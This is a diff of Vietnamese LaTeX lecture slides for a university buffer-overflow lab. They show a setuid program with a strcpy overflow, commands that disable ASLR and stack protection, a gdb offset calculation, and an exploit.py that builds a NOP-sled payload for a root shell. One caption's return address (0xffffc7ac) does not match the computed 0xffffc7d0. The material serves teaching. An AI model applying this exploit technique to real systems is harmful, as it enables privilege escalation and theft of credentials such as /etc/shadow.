@@ -106,10 +106,12 @@
     \item Chương trình \texttt{stack.c} có lỗ hổng tràn bộ đệm (dùng \texttt{strcpy}).
     \item \textbf{Khác với bài giảng:}
       \begin{itemize}
-        \item Kích thước (và địa chỉ) bộ đệm \texttt{buffer} \alert{không cố định},
-              nằm trong khoảng cho trước $[100, 300]$ byte.
-        \item Chương trình nhận \textbf{Mã sinh viên (MSV)} làm tham số dòng lệnh
-              và dùng MSV làm \alert{mầm gieo ngẫu nhiên}:
+        \item Bộ đệm \texttt{buffer} cấp phát bằng \texttt{alloca()} với kích thước
+              \alert{không cố định}: $100 + (\text{MSV}\bmod 100)$, tức khoảng
+              $[100, 199]$ byte.
+        \item Thêm một \alert{độ dịch stack} cá nhân hóa $(\text{MSV}\cdot 7+13)\bmod 257
+              \in [0,256]$ byte $\Rightarrow$ địa chỉ stack cũng thay đổi theo MSV.
+        \item Chương trình nhận \textbf{Mã sinh viên (MSV)} làm tham số dòng lệnh:
               \texttt{\$ ./stack <MSV>}
       \end{itemize}
     \item \textbf{Mục tiêu:} biên dịch \texttt{stack.c} thành chương trình có
@@ -141,7 +143,7 @@
     \begin{column}{0.52\textwidth}
       \centering
       \begin{tikzpicture}[font=\scriptsize, node distance=0pt]
-        \node[draw, minimum width=3.6cm, minimum height=0.7cm, fill=blue!10] (buf) {buffer[\,] (VLA)};
+        \node[draw, minimum width=3.6cm, minimum height=0.7cm, fill=blue!10] (buf) {buffer (alloca)};
         \node[draw, minimum width=3.6cm, minimum height=0.6cm, fill=blue!10, below=0pt of buf] (gap) {\ldots (đệm) \ldots};
         \node[draw, minimum width=3.6cm, minimum height=0.6cm, fill=orange!25, below=0pt of gap] (ebp) {saved ebp};
         \node[draw, minimum width=3.6cm, minimum height=0.7cm, fill=red!30, below=0pt of ebp] (ret) {\textbf{return address}};
@@ -158,15 +160,16 @@
 % ===================== SLIDE 6: LỖ HỔNG =====================
 \begin{frame}[fragile]{Lỗ hổng trong \texttt{stack.c}}
 \begin{lstlisting}[language=C]
-int bof(char *str, int bufsize)
+int bof(char *str, int buffer_size)
 {
-    char buffer[bufsize];   // kich thuoc & dia chi thay doi theo MSV
+    // cap phat dong tren stack, kich thuoc ca nhan hoa theo MSV
+    char *buffer = (char *)alloca(buffer_size);
     strcpy(buffer, str);    // <-- LO HONG: khong kiem tra do dai
     return 1;
 }
 \end{lstlisting}
   \begin{itemize}
-    \item \texttt{str} dài 517 byte, \texttt{buffer} chỉ 100--300 byte
+    \item \texttt{str} dài 512 byte, \texttt{buffer} chỉ 100--199 byte
           $\Rightarrow$ \texttt{strcpy} ghi tràn.
     \item Nếu dữ liệu tràn chứa địa chỉ do ta chọn tại đúng ô return address,
           CPU sẽ nhảy tới nơi ta muốn khi hàm kết thúc.
@@ -200,10 +203,11 @@ int bof(char *str, int bufsize)
 sudo sysctl -w kernel.randomize_va_space=0
 
 # Bien dich: 32-bit, tat bao ve stack, cho phep thuc thi tren stack
-gcc -m32 -g -O0 -fno-stack-protector -z execstack -o stack stack.c
+gcc -m32 -g -O0 -fno-stack-protector -z execstack \
+    -no-pie -o stack stack.c
 
 # Gan quyen root (setuid)
-sudo chown root stack
+sudo chown root:root stack
 sudo chmod 4755 stack
 \end{lstlisting}
   \footnotesize
@@ -219,25 +223,28 @@ sudo chmod 4755 stack
   \begin{columns}
     \begin{column}{0.5\textwidth}
       \footnotesize
-      Dùng \texttt{gdb} đặt breakpoint tại \texttt{bof}:
+      Dùng \texttt{gdb} dừng tại dòng \texttt{strcpy}:
 \begin{lstlisting}[language=bash]
 gdb -q stack
-b bof
+b stack.c:19
 run 23001842
-p $ebp
-p &buffer
+p $ebp       # 0xffffc738
+p buffer     # 0xffffc680
 \end{lstlisting}
       Công thức tính offset:
       \[
-        \text{offset} = (\$ebp + 4) - \&buffer
+        \text{offset} = (\$ebp + 4) - buffer
       \]
-      Ô return address nằm ngay trên saved \texttt{ebp}, tức tại \texttt{\$ebp + 4}.
+      \[
+        = \mathtt{0xffffc73c} - \mathtt{0xffffc680} = \mathbf{188}
+      \]
+      Ô return address nằm ngay trên saved \texttt{ebp} (\texttt{\$ebp + 4}).
     \end{column}
     \begin{column}{0.5\textwidth}
       \centering
-      \screenshot{5}{3.5}
-      \\[0.2cm]
-      \footnotesize\textit{Ảnh: gdb in ra \$ebp và \&buffer}
+      \includegraphics[width=\linewidth]{images/gdb_offset.png}
+      \\[0.15cm]
+      \footnotesize\textit{gdb (MSV 23001842): buffer, \$ebp, offset = 188}
     \end{column}
   \end{columns}
 \end{frame}
@@ -248,23 +255,27 @@ p &buffer
     \begin{column}{0.5\textwidth}
       \footnotesize
       \begin{itemize}
-        \item Lấy địa chỉ \texttt{buffer} từ gdb (ví dụ \texttt{0xffffcedc}).
-        \item Chọn \texttt{ret} trỏ vào \textbf{giữa} vùng NOP sled để chắc chắn
-              "hạ cánh" an toàn:
+        \item Lấy địa chỉ \texttt{buffer} từ gdb: \texttt{0xffffc680}.
+        \item Chọn \texttt{ret} trỏ vào \textbf{giữa} NOP sled để "hạ cánh" an toàn:
       \end{itemize}
       \[
-        \text{ret} = \&buffer + \delta
+        \text{ret} = buffer + \delta = \mathtt{0xffffc680} + \mathtt{0x150}
       \]
-      với $\delta$ là khoảng dư (vd $0x64 = 100$).
-      \begin{block}{Lưu ý}
-        Vì đã tắt ASLR, địa chỉ stack khi chạy trùng với khi debug trong gdb.
+      \[
+        = \mathbf{\mathtt{0xffffc7d0}}
+      \]
+      \begin{block}{Lưu ý quan trọng}
+        \footnotesize Địa chỉ \texttt{buffer} lệch vài chục byte giữa gdb và
+        lúc chạy thật (khác biến môi trường), nhưng \textbf{NOP sled rộng hấp thụ
+        sai số}: thực nghiệm mọi \texttt{ret} trong \texttt{[0xffffc7a0, 0xffffc860]}
+        đều cho root.
       \end{block}
     \end{column}
     \begin{column}{0.5\textwidth}
       \centering
-      \screenshot{5}{3.5}
-      \\[0.2cm]
-      \footnotesize\textit{Ảnh: gdb in \&buffer và tính toán ret}
+      \includegraphics[width=\linewidth]{images/gdb_offset.png}
+      \\[0.15cm]
+      \footnotesize\textit{buffer = \texttt{0xffffc680} $\Rightarrow$ ret = \texttt{0xffffc7ac}}
     \end{column}
   \end{columns}
 \end{frame}
@@ -272,41 +283,38 @@ p &buffer
 % ===================== SLIDE 11: CHỈNH EXPLOIT.PY =====================
 \begin{frame}[fragile]{Bước 3 --- Chỉnh \texttt{exploit.py} tạo badfile}
 \begin{lstlisting}[language=Python]
-# Hai tham so can chinh theo gia tri doc tu gdb:
-offset = 0x8c          # = ($ebp+4) - &buffer
-ret    = 0xffffcf40    # = &buffer + do du (tro vao NOP sled)
+# Hai tham so dien theo gia tri doc tu gdb (MSV 23001842):
+offset = 188           # = ($ebp+4) - buffer
+ret    = 0xffffc7d0    # = buffer + 0x150 (tro vao giua NOP sled)
 
-content = bytearray(0x90 for _ in range(517))   # NOP sled
-start = 517 - len(shellcode)
+content = bytearray(0x90 for _ in range(512))   # NOP sled 512 byte
+start = 512 - len(shellcode)
 content[start:] = shellcode                      # shellcode o cuoi
 content[offset:offset+4] = ret.to_bytes(4, 'little')  # ghi de return addr
 \end{lstlisting}
   \footnotesize
-  Chạy \texttt{python3 exploit.py} $\Rightarrow$ sinh ra \texttt{badfile} (517 byte).
-  \alert{Giá trị offset/ret ở trên chỉ là ví dụ; nhóm thay bằng số đọc từ gdb.}
+  Chạy \texttt{python3 exploit.py} $\Rightarrow$ sinh ra \texttt{badfile} (512 byte).
 \end{frame}
 
 % ===================== SLIDE 12: TẤN CÔNG =====================
 \begin{frame}[fragile]{Bước 4 --- Thực hiện tấn công}
   \begin{columns}
     \begin{column}{0.5\textwidth}
-\begin{lstlisting}[language=bash]
-$ python3 exploit.py
-$ ./stack 23001842
-MSV (seed)        : 23001842
-Kich thuoc buffer : 237 byte
-# id
-uid=0(root) gid=1000 ...
-\end{lstlisting}
       \footnotesize
-      Dấu nhắc đổi thành \texttt{\#} và lệnh \texttt{id} cho \alert{uid=0(root)}
-      $\Rightarrow$ tấn công thành công, dòng "Returned Properly" không xuất hiện.
+      Chạy \texttt{python3 exploit.py} rồi \texttt{./stack 23001842}.
+      Shellcode thực thi \texttt{setuid(0)} + \texttt{execve("/bin/sh")}:
+      \begin{itemize}
+        \item \texttt{id} cho \alert{uid=0(root)}, \texttt{whoami} cho \texttt{root}.
+        \item Đọc được \texttt{/etc/shadow} (chỉ root mới đọc được).
+        \item Dòng "...Tấn công thất bại" \textbf{không} xuất hiện.
+      \end{itemize}
+      $\Rightarrow$ Đã chiếm được \alert{root shell}.
     \end{column}
     \begin{column}{0.5\textwidth}
       \centering
-      \screenshot{5}{3.5}
-      \\[0.2cm]
-      \footnotesize\textit{Ảnh: shell root thu được}
+      \includegraphics[width=\linewidth]{images/exploit_root.png}
+      \\[0.15cm]
+      \footnotesize\textit{Kết quả thật: \texttt{uid=0(root)}}
     \end{column}
   \end{columns}
 \end{frame}
@@ -318,7 +326,7 @@ uid=0(root) gid=1000 ...
     box/.style={draw, rounded corners, fill=blue!10, minimum width=2.4cm,
                 minimum height=0.9cm, align=center}]
     \node[box] (a) {Biên dịch + setuid\\ \texttt{stack.c}};
-    \node[box, right=of a] (b) {gdb: tìm\\ \&buffer, \$ebp};
+    \node[box, right=of a] (b) {gdb: tìm\\ buffer, \$ebp};
     \node[box, right=of b] (c) {Tính offset\\ \& ret};
     \node[box, below=of c] (d) {Sửa \texttt{exploit.py}\\ tạo badfile};
     \node[box, left=of d] (e) {Chạy\\ \texttt{./stack <MSV>}};
